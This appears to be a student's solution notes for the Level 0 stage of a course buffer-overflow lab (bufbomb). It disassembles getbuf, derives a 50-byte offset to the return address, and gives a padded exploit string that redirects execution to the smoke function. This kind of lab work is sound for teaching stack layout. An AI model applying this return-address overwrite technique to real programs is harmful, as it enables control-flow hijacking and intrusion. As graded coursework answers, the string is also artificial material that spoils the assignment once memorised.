# Buffer Lab

> This assignment will help you develop a detailed understanding of IA-32 calling
> conventions and stack organization. It involves applying a series of buffer
> overflow attacks on an executable file bufbomb in the lab directory.

## Level 0: Candle/Smoke

Target: get BUFBOMB to execute the code for smoke when getbuf executes its return statement

Get `smoke` address from assembly code: `08049415`

```assembly
# buf
08049c12 <getbuf>:
 8049c12:	55                   	push   %ebp
 8049c13:	89 e5                	mov    %esp,%ebp
 8049c15:	83 ec 38             	sub    $0x38,%esp
 8049c18:	83 ec 0c             	sub    $0xc,%esp
 8049c1b:	8d 45 d2             	lea    -0x2e(%ebp),%eax
 8049c1e:	50                   	push   %eax
 8049c1f:	e8 5e fa ff ff       	call   8049682 <Gets>
 8049c24:	83 c4 10             	add    $0x10,%esp
 8049c27:	b8 01 00 00 00       	mov    $0x1,%eax
 8049c2c:	c9                   	leave
 8049c2d:	c3                   	ret
```

`lea -0x2e(%ebp),%eax` => in `buf[M]`, the number of M is 46 => plus 4 bytes in `%ebp`,
the return address should begin at 50.

That is, in this string, the first 50 bytes mean nothing, 50~53 mean the return address.
So, the string should be:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 15 94 04 08
```
